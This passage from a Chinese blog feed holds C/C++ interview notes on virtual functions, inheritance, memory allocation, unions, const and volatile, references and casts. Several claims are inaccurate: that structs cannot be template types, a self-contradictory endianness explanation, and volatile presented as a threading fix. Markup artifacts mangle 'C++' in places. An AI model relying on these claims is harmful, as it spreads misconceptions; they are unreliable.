C<ins>的解释是：派生类对象的基类成分会在派生类自身成分被构造之前先构造妥当，派生类对象构造期间会首先进入基类的构造函数，在基类构造函数执行时继承类的成员变量尚未初始化，对象类型是基类类型，而不是派生类类型，虚函数会被编译器解析为基类，若使用运行时类型信息，也会把对象视为基类类型，构造期间调用虚函数，会调用自己的虚函数，此时虚函数和普通函数没有区别了，达不到多态的效果。<br>同样，进入基类析构函数时，对象也是基类类型。C</ins>中派生类在构造时会先调用基类的构造函数再调用派生类的构造函数，析构时则相反，先调用派生类的析构函数再调用基类的析构函数。一旦派生类析构函数运行，这个对象的派生类数据成员就被视为未定义的值，所以 C++ 就将它们视为不再存在。假设一个派生类的对象进行析构，首先调用了派生类的析构，然后再调用基类的析构时，遇到了一个虚函数，这个时候有两种选择：</p><ol><li>编译器调用这个虚函数的基类版本，那么虚函数则失去了运行时调用正确版本的意义；</li><li>编译器调用这个虚函数的派生类版本，但是此时对象的派生类部分已经完成析构，“数据成员就被视为未定义的值”，这个函数调用会导致未知行为。</li></ol><h2 id="28-重载overload和重写overried有的书也叫做覆盖的区别"><a class="markdownIt-Anchor" href="#28-重载overload和重写overried有的书也叫做覆盖的区别"></a> 2.8 重载(overload)和重写(overried，有的书也叫做“覆盖”)的区别？</h2><ul><li><strong>重载</strong>：是指允许存在多个同名函数，而这些函数的参数列表不同</li><li><strong>重写</strong>：是指派生类重新定义基类虚函数的方法。</li></ul><h2 id="29-虚函数表存放的内容以及在内存中的位置"><a class="markdownIt-Anchor" href="#29-虚函数表存放的内容以及在内存中的位置"></a> 2.9 虚函数表存放的内容以及在内存中的位置</h2><ul><li>每个对象里有虚(函数表)指针，指向虚函数表，虚函数表里存放了虚函数的地址。虚函数表是顺序存放虚函数地址的，不需要用到链表。</li><li>还有类的类型信息，在《深度探索C++对象模型》中有提到</li><li>C<ins>中**虚函数表位于只读数据段（.rodata），也就是C</ins>内存模型中的常量区；而虚函数则位于代码段（.text），也就是C++内存模型中的代码区。**</li></ul><h2 id="210-如果虚函数非常有效我们是否可以把每个函数都声明为虚函数"><a class="markdownIt-Anchor" href="#210-如果虚函数非常有效我们是否可以把每个函数都声明为虚函数"></a> 2.10 如果虚函数非常有效，我们是否可以把每个函数都声明为虚函数？</h2><p>不行，这是因为虚函数是有代价的：</p><ul><li>由于每个虚函数的对象都必须维护一个虚函数表，因此在使用虚函数的时候会产生一个系统开销。如果仅是一个很小的类，且不想派生其他类，那么根本没必要使用虚函数。</li><li><strong>虚函数效率低</strong>。因为虚函数需要一次间接的寻址，而一般的函数可以在编译时定位到函数的地址。虚函数(动态类型调用)是要根据某个指针定位到函数的地址。多增加了一个过程，效率肯定会低一些，但带来了运行时的多态。</li></ul><h1 id="3-继承"><a class="markdownIt-Anchor" href="#3-继承"></a> 3 继承</h1><h2 id="31-继承的概念"><a class="markdownIt-Anchor" href="#31-继承的概念"></a> 3.1 继承的概念</h2><p>派生类可以具有基类的特性，共享基类的成员函数，使用基类的数据成员，还可以定义自己的数据成员和函数成员。从一个基类派生的称为单继承，从多个基类派生的称为多继承。</p><p><strong>C++中，继承方式有 3 种</strong>：</p><ol><li>公有继承：public、protected、private 权限均不变</li><li>私有继承：public、protected 权限变为 private</li><li>保护继承：public 变为 protected</li></ol><p><strong>实现的访问控制如下</strong>：</p><ol><li>public：自己、友元、派生类、外界均可访问</li><li>protected：自己、友元、派生类可以访问</li><li>private：自己、友元可以访问</li></ol><h2 id="32-多继承的优缺点"><a class="markdownIt-Anchor" href="#32-多继承的优缺点"></a> 3.2 多继承的优缺点</h2><p><strong>优点</strong></p><ol><li>**简单，清晰，更有利于复用。**不会因为基类一个小小的改变而大张旗鼓去改代码。</li></ol><p><strong>缺点</strong></p><ol><li>**二义性。**两个基类中有同名方法的时候，需要在子类的调用中指明此方法出自那个基类。</li><li><strong>使用父类指针指向子类对象变得复杂</strong>。你不得不用到C++中提供的dynamic_cast来执行强制转换。至于dynamic_cast，也是个麻烦的家伙，它是在运行期间而非编译期间进行转换的（因为编译期间它不能确定到底要转向一个什么类型），因此除了会带来一些轻微的性能损失，它要求编译器允许RTTI（Runtime Type Information，运行时类型信息），也就是要求编译器保存所有类在运行时的信息。</li><li><strong>使得子类的vtable变得不同寻常</strong>。单继承的vtable只是在父类vtable的表尾加上新的虚函数，子类对象的vtable中包含了有序的父类vtable。而对于多重继承，两个父类可能有完全不同的vtable，因此，子类的vtable中绝对不可能包含完整的有序的两个父类的vtable。子类的vtable中可能包含了两块不相连的父类vtable，因此每个父类都被迫追加了一个vtable，也就是，每个父类的对象都添加了一个指针。</li></ol><p>孰优孰劣，自己把握。没有永远最好的，只有当前适合的。Java中摒弃了多重继承可能也是出于太过复杂，可能有不可料知的结果的原因。</p><p>不要随意使用多重继承。大多数的情况，用容器（也就是类的组合法）会更好些。</p><p><a href="https://blog.csdn.net/woodforestbao/article/details/4500406" target="_blank" rel="noopener">https://blog.csdn.net/woodforestbao/article/details/4500406</a></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++基础</title>
      <link href="/2022/04/19/C++%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/04/19/C++%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><ul><li>《面向对象C++程序设计》皮德常 编著 清华大学出版社 2017</li><li>《C++ Primer Plus (第6版)中文版》Stephen Prata 著 张海龙 袁国忠 译 人民邮电出版社 2012</li></ul></blockquote><h1 id="1-c-和-c-的区别"><a class="markdownIt-Anchor" href="#1-c-和-c-的区别"></a> 1 c 和 c++ 的区别</h1><ul><li>C是一种结构化语言，重点在于算法和数据结构。C程序的设计首先考虑的是如何通过一个过程，对输入(或环境条件)进行运算处理得到输出(或实现过程(事务)控制)。</li><li>而对于C++，首先考虑的是如何构造一个对象模型，让这个模型能够契合与之对应的问题域，这样就可以通过获取对象的状态信息得到输出或实现过程(事务)控制。</li><li>C++中new和delete是对内存分配的运算符，取代了C中的malloc和free。</li><li>标准C++中的字符串类取代了标准C函数库头文件中的字符数组处理函数（C中没有字符串类型）。</li><li>C++中用来做控制态输入输出的iostream类库替代了标准C中的stdio函数库。</li><li>C++中的try/catch/throw异常处理机制取代了标准C中的setjmp()和longjmp()函数。</li><li>在C<ins>中，允许有相同的函数名，不过它们的参数类型不能完全相同，这样这些函数就可以相互区别开来。而这在C语言中是不允许的。也就是C</ins>可以重载，C语言不允许。</li><li>C<ins>语言中，允许变量定义语句在程序中的任何地方，只要在是使用它之前就可以；而C语言中，必须要在函数开头部分。而且C</ins>允许重复定义变量，C语言也是做不到这一点的</li><li>在C++中，除了值和指针之外，新增了引用。引用型变量是其他变量的一个别名，我们可以认为他们只是名字不相同，其他都是相同的。</li><li>C++相对与C增加了一些关键字，如：bool、using、dynamic_cast、namespace等等</li></ul><h1 id="2-newdelete-mallocfree"><a class="markdownIt-Anchor" href="#2-newdelete-mallocfree"></a> 2 new/delete、malloc/free</h1><h2 id="21-newdelete-mallocfree-区别"><a class="markdownIt-Anchor" href="#21-newdelete-mallocfree-区别"></a> 2.1 new/delete、malloc/free 区别</h2><table><thead><tr><th style="text-align:center">特征</th><th style="text-align:center">new/delete</th><th style="text-align:center">malloc/free</th></tr></thead><tbody><tr><td style="text-align:center">分配内存的位置</td><td style="text-align:center">自由存储区</td><td style="text-align:center">堆</td></tr><tr><td style="text-align:center">内存分配成功的返回值</td><td style="text-align:center">完整类型指针</td><td style="text-align:center">void*</td></tr><tr><td style="text-align:center">内存分配失败的返回值</td><td style="text-align:center">默认抛出异常</td><td style="text-align:center">返回 NULL</td></tr><tr><td style="text-align:center">分配内存的大小</td><td style="text-align:center">由编译器根据类型计算得出</td><td style="text-align:center">必须显式指定字节数</td></tr><tr><td style="text-align:center">处理数组</td><td style="text-align:center">有处理数组的 new 版本 new[]</td><td style="text-align:center">需要用户计算数组的大小后进行内存分配</td></tr><tr><td style="text-align:center">是否相互调用</td><td style="text-align:center">可以，看具体的 operator new/delete 实现</td><td style="text-align:center">不可调用 new</td></tr><tr><td style="text-align:center">函数重载</td><td style="text-align:center">允许</td><td style="text-align:center">不允许</td></tr><tr><td style="text-align:center">构造函数与析构函数</td><td style="text-align:center">调用</td><td style="text-align:center">不调用</td></tr></tbody></table><h2 id="22-c有了mallocfree为什么还需要newdelete"><a class="markdownIt-Anchor" href="#22-c有了mallocfree为什么还需要newdelete"></a> 2.2 C++有了malloc/free，为什么还需要new/delete?</h2><ul><li>malloc/free是C++/C语言的标准库函数，new/delete是C++的运算符。他们都可用于申请动态内存和释放内存。</li><li>对于非内部数据类型的对象而言，只用malloc/free无法满足动态对象的要求。对象在创建的同时要自动执行构造函数，对象在消亡之前要自动执行析构函数。由于malloc/free是库函数而不是运算符，不在编译器控制权限之内，不能够把执行构造函数和析构函数的任务强加于malloc/free。</li><li>因此C++需要一个能完成动态内存分配和初始化工作的运算符new，以及一个能完成清理与释放内存工作的运算符delete。new/delete不是库函数，是运算符。</li></ul><h2 id="23-delete-与-delete-区别"><a class="markdownIt-Anchor" href="#23-delete-与-delete-区别"></a> 2.3 delete 与 delete []区别</h2><p>delete 只会调用一次析构函数，而 delete[]会针对每一个成员都调用一次析构函数。</p><h2 id="24-内存泄漏与定位"><a class="markdownIt-Anchor" href="#24-内存泄漏与定位"></a> 2.4 内存泄漏与定位</h2><p>内存泄漏并非指的是内存在物理上的消失，而是分配某段内存后，失去了对该内存的控制，造成内存的浪费。比如 C++ new 之后没有 delete。</p><p><strong>定位内存泄露</strong>：</p><ol><li>在windows平台下通过CRT中的库函数进行检测；</li><li>在可能泄漏的调用前后生成块的快照，比较前后的状态，定位泄漏的位置</li><li>Linux下通过工具valgrind检测</li></ol><h1 id="3-结构体-联合体"><a class="markdownIt-Anchor" href="#3-结构体-联合体"></a> 3 结构体、联合体</h1><h2 id="31-结构体与联合有何区别"><a class="markdownIt-Anchor" href="#31-结构体与联合有何区别"></a> 3.1 结构体与联合有何区别</h2><ol><li>结构体和联合都是由多个不同的数据类型成员组成，但在任何同一时刻，联合中只存放了一个被选中的成员（所有成员共用一块地址空间），而结构体的所有成员都存在（不同成员的存放地址不同）。</li><li>对于联合的不同成员赋值，将会对其它成员重写，原来成员的值就不存在了。而对于结构体的不同成员赋值是互不影响的。</li></ol><h2 id="32-union的好处"><a class="markdownIt-Anchor" href="#32-union的好处"></a> 3.2 union的好处</h2><ol><li>节省内存空间</li><li>测大小端存储（大相反（低位存高位），小相同（低位存低位），叉八六（X86计算机)，必小端。）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">typedef union un&#123;</span><br><span class="line">   int i;</span><br><span class="line">   char ch[2];</span><br><span class="line">&#125; un;</span><br><span class="line">int main()&#123;</span><br><span class="line">    un u;</span><br><span class="line">    u.ch[0] = 10;</span><br><span class="line">    u.ch[1] = 1;</span><br><span class="line">    printf(&quot;%d&quot;, (short)u.i);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析： 10 相当于 0000 1010     低地址 1  相当于 0000 0001     高地址 如果是小端模式，低地址存放高位，高地址存放低位，那么该值按照正常顺序书写就是： 0000 0001 0000 1010，结果为266。</p><h2 id="33-struct可以有构造-析构等成员函数吗如果有那么与class还有区别吗"><a class="markdownIt-Anchor" href="#33-struct可以有构造-析构等成员函数吗如果有那么与class还有区别吗"></a> 3.3 struct可以有构造、析构等成员函数吗？如果有，那么与class还有区别吗？</h2><ul><li>struct可以有构造函数、析构函数，之间也可以继承。</li><li>C++中的struct其实和class意义一样，唯一不同的就是struct里面默认的访问控制是public，class中默认的访问控制是private。</li><li>C<ins>中存在struct关键字的唯一意义就是为了让C程序员有个归属感，是为了让C</ins>编译器兼容以前用C开发的项目。</li></ul><p><strong>相同点</strong></p><ul><li>两者都拥有成员函数、公有和私有部分</li><li>任何可以使用class完成的工作，同样可以使用struct完成</li></ul><p><strong>不同点</strong></p><ul><li>两者中如果不对成员不指定公私有，struct默认是公有的，class则默认是私有的</li><li>class默认是private继承，而struct模式是public继承</li><li>class可以作为模板类型，struct不行</li></ul><p><strong>引申</strong>：C++和C的struct区别</p><ul><li>C语言中：struct是用户自定义数据类型（UDT）；C<ins>中struct是抽象数据类型（ADT），支持成员函数的定义，（C</ins>中的struct能继承，能实现多态）</li><li>C中struct是没有权限的设置的，且struct中只能是一些变量的集合体，可以封装数据却不可以隐藏数据，而且成员不可以是函数</li><li>C++中，struct增加了访问权限，且可以和类一样有成员函数，成员默认访问说明符为public（为了与C兼容）</li><li>struct作为类的一种特例是用来自定义数据结构的。一个结构标记声明后，在C中必须在结构标记前加上struct，才能做结构类型名（除：typedef struct class{};）;C<ins>中结构体标记（结构体名）可以直接作为结构体类型名使用，此外结构体struct在C</ins>中被当作类的一种特例</li></ul><h1 id="4-c语言关键字及其对应的含义"><a class="markdownIt-Anchor" href="#4-c语言关键字及其对应的含义"></a> 4 C语言关键字及其对应的含义</h1><ul><li>数据类型关键字<ul><li>A基本数据类型（5个）<ul><li>void：声明函数无返回值或无参数，声明无类型指针，显式丢弃运算结果</li><li>char：字符型类型数据，属于整型数据的一种</li><li>int：整型数据，通常为编译器指定的机器字长</li><li>float：单精度浮点型数据，属于浮点数据的一种</li><li>double：双精度浮点型数据，属于浮点数据的一种</li></ul></li><li>B类型修饰关键字（4个）<ul><li>short：修饰int，短整型数据，可省略被修饰的int。</li><li>long：修饰int，长整形数据，可省略被修饰的int。</li><li>signed：修饰整型数据，有符号数据类型</li><li>unsigned：修饰整型数据，无符号数据类型</li></ul></li><li>C复杂类型关键字（5个）<ul><li>struct：结构体声明</li><li>union：共用体声明</li><li>enum：枚举声明</li><li>typedef：声明类型别名</li><li>sizeof：得到特定类型或特定类型变量的大小</li></ul></li><li>D存储级别关键字（6个）<ul><li>auto：指定为自动变量，由编译器自动分配及释放。通常在栈上分配</li><li>static：指定为静态变量，分配在静态变量区，修饰函数时，指定函数作用域为文件内部</li><li>register：指定为寄存器变量，建议编译器将变量存储到寄存器中使用，也可以修饰函数形参，建议编译器通过寄存器而不是堆栈传递参数</li><li>extern：指定对应变量为外部变量，即在另外的目标文件中定义，可以认为是约定由另外文件声明的对象的一个“引用“</li><li>const：与volatile合称“cv特性”，指定变量不可被当前线程/进程改变（但有可能被系统或其他线程/进程改变）</li><li>volatile：与const合称“cv特性”，指定变量的值有可能会被系统或其他进程/线程改变，强制编译器每次从内存中取得该变量的值</li></ul></li></ul></li><li>流程控制关键字<ul><li>A跳转结构（4个）<ul><li>return：用在函数体中，返回特定值（或者是void值，即不返回值）</li><li>continue：结束当前循环，开始下一轮循环</li><li>break：跳出当前循环或switch结构</li><li>goto：无条件跳转语句</li></ul></li><li>B分支结构（5个）<ul><li>if：条件语句</li><li>else：条件语句否定分支（与if连用）</li><li>switch：开关语句（多重分支语句）</li><li>case：开关语句中的分支标记</li><li>default：开关语句中的“其他”分治，可选。</li></ul></li><li>C循环结构（3个）：for、do、while</li></ul></li></ul><h1 id="5-变量存储类型"><a class="markdownIt-Anchor" href="#5-变量存储类型"></a> 5 变量存储类型</h1><h2 id="51-c语言支持的四种变量存储类型"><a class="markdownIt-Anchor" href="#51-c语言支持的四种变量存储类型"></a> 5.1 C语言支持的四种变量存储类型</h2><ol><li><p><strong>auto</strong>：auto称为自动变量（局部变量）</p></li><li><p>static</p><p>：static称为静态变量，根据变量的类型可以分为静态局部变量和静态全局变量。</p><ul><li><strong>静态局部变量</strong>：它与局部变量的区别在于，在函数退出时，这个变量始终存在，但不能被其它函数使用；当再次进入该函数时，将保存上次的结果。</li><li><strong>静态全局变量</strong>：只在定义它的源文件中可见而在其它源文件中不可见的变量。它与全局变量的区别是：全局变量可以被其它源文件使用，而静态全局变量只能被所在的源文件使用。</li></ul></li><li><p><strong>extern</strong>：extern称为外部申明。为了使变量或者函数除了在定义它的源文件中可以使用外，还可以被其它文件使用。因此通知每一个程序模块文件，此时可用extern来说明。</p></li><li><p><strong>register</strong>：register称为寄存器变量。它只能用于整型和字符型变量。定义符register说明的变量被存储在CPU的寄存器中，定义一个整型寄存器变量可写成: <code>register int a</code>;</p></li></ol><p>对于以上四种数据的存储位置：register变量存在CPU的寄存器中；auto类型变量存在内存的栈；static型的局部变量和全局变量以及extern型变量（即全局变量），存在于内存的静态区。</p><h2 id="52-static-的作用"><a class="markdownIt-Anchor" href="#52-static-的作用"></a> 5.2 static 的作用</h2><ol><li><p><strong>隐藏</strong>：当同时编译多个文件时，所有未加 static 前缀的全局变量和函数都具有全局可见性，其它的源文件也能访问。如果加了 static，就会对其它源文件隐藏。利用这一特性可以在不同的文件中定义同名函数和同名变量，而不必担心命名冲突。static 可以用作函数和变量的前缀，对于函数来讲，static 的作用仅限于隐藏。</p></li><li><p><strong>保持变量内容的持久</strong>：存储在静态数据区的变量会在程序刚开始运行时就完成初始化，也是唯一的一次初始化。如果作为 static 局部变量在函数内定义，它的生存期为整个源程序，但是其作用域仍与局部变量相同，只能在定义该变量的函数内使用该变量。退出该函数后，尽管该变量还继续存在，但不能使用它。</p></li><li><p>默认初始化为 0</p></li><li><p>在类中声明 static 变量或者函数时，初始化时使用作用域运算符来标明它所属类，因此，静态数据成员是类的成员，而不是对象的成员，这样就出现以下作用：</p><ol><li>类的静态成员函数是属于整个类而非类的对象，所以它没有 this 指针，这就导致了它仅能访问类的静态数据和静态成员函数。</li><li>不能将静态成员函数定义为虚函数。</li><li>静态成员变量地址是指向其数据类型的指针，静态成员函数地址类型是一个“非成员函数指针”。</li><li>static 并没有增加程序的时空开销，相反它还缩短了派生类对基类静态成员的访问时间，节省了派生类的内存空间。</li><li>静态数据成员是静态存储的，所以必须对它进行初始化。（程序员手动初始化，否则编译时一般不会报错，但是在链接时会报错误）</li><li>静态成员为基类和派生类共享，但在派生类中重复定义了基类中的静态成员，不会引起错误。</li></ol><p>注意，静态成员初始化与一般数据成员初始化不同:</p><ol><li>初始化在类体外进行，而前面不加 static，以免与一般静态变量或对象相混淆；</li><li>初始化时不加该成员的访问权限控制符 private，public 等；</li><li>初始化时使用作用域运算符来标明它所属类；</li></ol><p>所以我们得出静态数据成员初始化的格式：<code>&lt;数据类型&gt;&lt;类名&gt;::&lt;静态数据成员名&gt;=&lt;值&gt;</code></p></li></ol><h2 id="53-请说出-const-与define-相比有何优点"><a class="markdownIt-Anchor" href="#53-请说出-const-与define-相比有何优点"></a> 5.3 <strong>请说出 const 与#define 相比，有何优点？</strong></h2><p>const 常量有数据类型，而宏常量没有数据类型。编译器可以对前者进行类型安全检查。而对后者只进行字符替换，并且在字符替换可能会产生意料不到的错误。</p><p><strong>const还具有以下优点</strong>：</p><ol><li>提高代码安全性。</li><li>提高代码的可读性和可维护性。</li><li>提高程序的效率。</li><li>当 const 和 non-const 成员函数具有本质上相同的实现的时候，使用 non-const 版本调用 const 版本可以避免重复代码。</li></ol><h2 id="54-c中顶层-const-和底层-const"><a class="markdownIt-Anchor" href="#54-c中顶层-const-和底层-const"></a> 5.4 C++中顶层 const 和底层 const</h2><p>如果 const 右结合修饰的为类型或者*，那这个 const 就是一个底层 const，表示指针所指向的对象是个常量。</p><p>如果 const 右结合修饰的为标识符，那这个 const 就是一个顶层 const，表示指针本身是个常量。</p><h2 id="55-const-关键字的使用"><a class="markdownIt-Anchor" href="#55-const-关键字的使用"></a> 5.5 const 关键字的使用</h2><ol><li>阻止一个<strong>变量</strong>被改变，可以使用const关键字。在定义该const变量时，通常需要(必须)对它进行初始化，因为以后就没有机会再去改变它了；</li><li>对<strong>指针</strong>来说，可以指定指针本身为const，也可以指定指针所指的数据为const，或二者同时指定为const；</li><li>在一个<strong>函数声明</strong>中，const可以修饰形参，表明它是一个输入参数，在函数内部不能改变其值；</li><li>对于类的成员函数，若指定其为const类型，则表明其是一个常函数，不能修改类的成员变量，类的常对象只能访问类的常成员函数；</li><li>对于类的成员函数，有时候必须指定其返回值为const类型，以使得其返回值不为“左值”。</li><li>const成员函数可以访问非const对象的非const数据成员、const数据成员，也可以访问const对象内的所有数据成员；</li><li>非const成员函数可以访问非const对象的非const数据成员、const数据成员，但不可以访问const对象的任意数据成员；</li><li>一个没有明确声明为const的成员函数被看作是将要修改对象中数据成员的函数，而且编译器不允许它为一个const对象所调用。因此const对象只能调用const成员函数。</li><li>const类型变量可以通过类型转换符const_cast将const类型转换为非const类型；</li><li>const类型变量必须定义的时候进行初始化，因此也导致如果类的成员变量有const类型的变量，那么该变量必须在类的初始化列表中进行初始化；</li><li>对于函数值传递的情况，因为参数传递是通过复制实参创建一个临时变量传递进函数的，函数内只能改变临时变量，但无法改变实参。则这个时候无论加不加const对实参不会产生任何影响。但是在引用或指针传递函数调用中，因为传进去的是一个引用或指针，这样函数内部可以改变引用或指针所指向的变量，这时const 才是实实在在地保护了实参所指向的变量。因为在编译阶段编译器对调用函数的选择是根据实参进行的，所以，只有引用传递和指针传递可以用是否加const来重载。一个拥有顶层const的形参无法和另一个没有顶层const的形参区分开来。</li></ol><h2 id="56-volatile-关键字的使用"><a class="markdownIt-Anchor" href="#56-volatile-关键字的使用"></a> 5.6 volatile 关键字的使用</h2><ol><li>volatile 关键字是一种类型修饰符，用它声明的类型变量表示可以被某些编译器未知的因素更改，比如：操作系统、硬件或者其它线程等。遇到这个关键字声明的变量，编译器对访问该变量的代码就不再进行优化，从而可以提供对特殊地址的稳定访问。</li><li>当要求使用 volatile 声明的变量的值的时候，系统总是重新从它所在的内存读取数据，即使它前面的指令刚刚从该处读取过数据。</li><li>volatile定义变量的值是易变的，每次用到这个变量的值的时候都要去重新读取这个变量的值，而不是读寄存器内的备份。多线程中被几个任务共享的变量需要定义为volatile类型。</li><li>volatile 指针和 const 修饰词类似，const 有常量指针和指针常量的说法，volatile 也有相应的概念</li><li>可以把一个非volatile int赋给volatile int，但是不能把非volatile对象赋给一个volatile对象。</li><li>除了基本类型外，对用户定义类型也可以用volatile类型进行修饰。</li><li>C++中一个有volatile标识符的类只能访问它接口的子集，一个由类的实现者控制的子集。用户只能用const_cast来获得对类型接口的完全访问。此外，volatile向const一样会从类传递到它的成员。</li><li><strong>多线程下的volatile</strong>：有些变量是用volatile关键字声明的。当两个线程都要用到某一个变量且该变量的值会被改变时，应该用volatile声明，该关键字的作用是防止优化编译器把变量从内存装入CPU寄存器中。如果变量被装入寄存器，那么两个线程有可能一个使用内存中的变量，一个使用寄存器中的变量，这会造成程序的错误执行。volatile的意思是让编译器每次操作该变量时一定要从内存中真正取出，而不是使用已经存在寄存器中的值。</li></ol><h2 id="57-一个参数可以既是const又是volatile吗解释为什么"><a class="markdownIt-Anchor" href="#57-一个参数可以既是const又是volatile吗解释为什么"></a> 5.7 一个参数可以既是const又是volatile吗？解释为什么</h2><ul><li>可以。一个例子就是只读的状态寄存器。它是volatile，因为他可能被意想不到地改变；她又是const，因为程序不应该试图去改变它。</li><li>尽管这并不很正常。一个例子就是当一个中断服务子程序修改一个指向一个buffer的指针时。</li></ul><h1 id="6-c-字符串和-c字符串的区别"><a class="markdownIt-Anchor" href="#6-c-字符串和-c字符串的区别"></a> 6 <strong>C 字符串和 C++字符串的区别</strong></h1><ol><li>C 字符串是基本数据类型，即字符数组；C++字符串是类 string</li><li>C 字符串函数是外部函数，字符串作为参数被传进来；C++字符串函数是字符串类内部定义的，用<code>.</code>来直接使用</li><li>C++字符串中对一些运算符进行了重载</li></ol><h1 id="7-引用和指针"><a class="markdownIt-Anchor" href="#7-引用和指针"></a> 7 引用和指针</h1><h2 id="71-引用与指针区别"><a class="markdownIt-Anchor" href="#71-引用与指针区别"></a> 7.1 引用与指针区别</h2><ol><li><p><strong>初始化区别</strong>：引用必须被初始化，指针不必。</p></li><li><p><strong>可修改区别</strong>：引用初始化以后不能被改变，指针可以改变所指的对象。</p></li><li><p><strong>非空区别</strong>：不存在指向空值的引用，但是存在指向空值的指针。</p></li><li><p><strong>合法性区别</strong>：在使用引用之前不需要测试他的合法性；相反，指针则应该总是被测试，防止其为空。</p></li><li><p>应用区别</p><p>：</p><ul><li>使用指针的情况<ul><li>考虑到存在不指向任何对象的可能(在这种情况下，能够设置指针为空)</li><li>需要能够在不同时刻指向不同对象(在这种情况下，能够改变指针的指向)</li></ul></li><li><strong>使用引用的情况</strong>：总是指向一个对象并且一旦指向一个对象后就不会改变指向</li></ul></li></ol><h2 id="72-在什么时候需要使用常引用"><a class="markdownIt-Anchor" href="#72-在什么时候需要使用常引用"></a> 7.2 <strong>在什么时候需要使用“常引用”？</strong></h2><p>如果既要利用引用提高程序的效率，又要保护传递给函数的数据不在函数中被改变，就应使用常引用。</p><h2 id="73-将引用作为函数返回值类型的优点和注意事项"><a class="markdownIt-Anchor" href="#73-将引用作为函数返回值类型的优点和注意事项"></a> 7.3 <strong>将“引用”作为函数返回值类型的优点和注意事项</strong></h2><p>好处：在内存中不产生被返回值的副本，提高效率</p><p><strong>注意事项</strong>：</p><ol><li>不能返回局部变量的引用。主要原因是局部变量会在函数返回后被销毁，因此被返回的引用就成为了&quot;无所指&quot;的引用，程序会进入未知状态。</li><li>不能返回函数内部 new 分配的内存的引用。原因是引用所指向的空间就无法释放，造成内存泄漏。</li><li>可以返回类成员的引用，但最好是 const。主要原因是如果其它对象可以获得该属性的非常量引用（或指针），那么对该属性的单纯赋值就会破坏业务规则的完整性。</li><li>流操作符和赋值操作符重载返回值申明为引用。</li><li>在另外的一些操作符中，却千万不能返回引用，例如四则运算符。</li></ol><h2 id="74-句柄和指针的区别与联系"><a class="markdownIt-Anchor" href="#74-句柄和指针的区别与联系"></a> 7.4 句柄和指针的区别与联系</h2><p>句柄和指针其实是两个截然不同的概念。</p><ul><li>Windows系统用句柄标记系统资源，隐藏系统的信息。只要知道有这个东西，然后去调用即可，他是一个32bit的uint。</li><li>指针则标记某个物理内存地址。</li></ul><h2 id="75-指针常量和常量指针"><a class="markdownIt-Anchor" href="#75-指针常量和常量指针"></a> 7.5 指针常量和常量指针</h2><ul><li>常量指针是一个指针，读成常量的指针，指向一个只读变量。如<code>int const *p</code>或<code>const int *p</code></li><li>指针常量是一个不能给改变指向的指针。指针是个常量，不能中途改变指向，如<code>int *const p</code></li></ul><p><strong>技巧</strong>：* 前面的是对被指向对象的修饰，* 后面的是对指针本身的修饰。</p><h1 id="8-递归的优缺点"><a class="markdownIt-Anchor" href="#8-递归的优缺点"></a> 8 <strong>递归的优缺点</strong></h1><ul><li><strong>优点</strong>：代码简洁，容易理解</li><li><strong>缺点</strong>：时间效率低，递归爆栈</li></ul><h1 id="9-c四种类型转换static_cast-dynamic_cast-const_cast-reinterpret_cast"><a class="markdownIt-Anchor" href="#9-c四种类型转换static_cast-dynamic_cast-const_cast-reinterpret_cast"></a> 9 C++四种类型转换：static_cast, dynamic_cast, const_cast, reinterpret_cast</h1><ol><li>static_cast 用的最多，能用于多态向上转化，如果向下转能成功但是不安全。</li><li>dynamic_cast 用于动态类型转换。只能用于含有虚函数的类，用于类层次间的向上和向下转化。只能转指针或引用。向下转化时，如果是非法的对于指针返回 NULL，对于引用抛异常。</li><li>const_cast 用于将 const 变量转为非 const</li><li>reinterpret_cast 几乎什么都可以转，比如将 int 转指针，可能会出问题，尽量少用。</li></ol><p>C 的强制转换表面上看起来功能强大什么都能转，但是转化不够明确，不能进行错误检查，容易出错。</p><h1 id="10-c是不是类型安全的"><a class="markdownIt-Anchor" href="#10-c是不是类型安全的"></a> 10 <strong>C++是不是类型安全的？</strong></h1><p>不是。<strong>两个不同类型的指针之间可以强制转换</strong></p><h1 id="11-内联函数与宏定义的区别"><a class="markdownIt-Anchor" href="#11-内联函数与宏定义的区别"></a> 11 <strong>内联函数与宏定义的区别</strong></h1><p>所谓的内联函数就是那些完整地定义在类内部的函数成员。</p><p>C++ 宏定义将一个标识符定义为一个字符串，源程序中的该标识符均以指定的字符串来代替。</p><ul><li>宏定义在预编译的时候就会进行宏替换；内联函数在编译阶段，在调用内联函数的地方进行替换，减少了函数的调用过程，但是使得编译文件变大。因此，内联函数适合简单函数，对于复杂函数，即使定义了内联，编译器可能也不会按照内联的方式进行编译。</li><li>内联函数相比宏定义更安全，内联函数可以检查参数，而宏定义只是简单的文本替换。因此推荐使用内联函数，而不是宏定义。</li></ul><hr><h1 id="补充1-c笔记"><a class="markdownIt-Anchor" href="#补充1-c笔记"></a> <strong>补充1 C笔记</strong></h1><ol><li>exe已停止工作：1)漏&amp;；2)分母为0</li><li>定义整型，输入实型：自动截取小数部分，eg:2.5-&gt;2(赋值亦是)。</li><li>输出数据出错：格式字符与变量类型未对应；为赋初值。特别注意除号“/”和等号“==”。</li><li>数据范围与补码：-1全1，正负0全0，负数min为“1+全0”;溢出取低位，小数对应21,22,23…小数转二进制数: x/2取整数部分直到小数为0。</li><li>else就近结合。</li><li>|| 和 &amp;&amp; 的短路特性。</li><li>数组a[]: scanf(&quot;%d&quot;, a)指对a[0]赋值。</li><li>字符串：scanf(&quot;%s&quot;, a)-&gt;遇’ ‘, ‘\0’, ‘\t’为截点(’\n’跳出)开始不计；puts()=printf(&quot;%s&quot;, 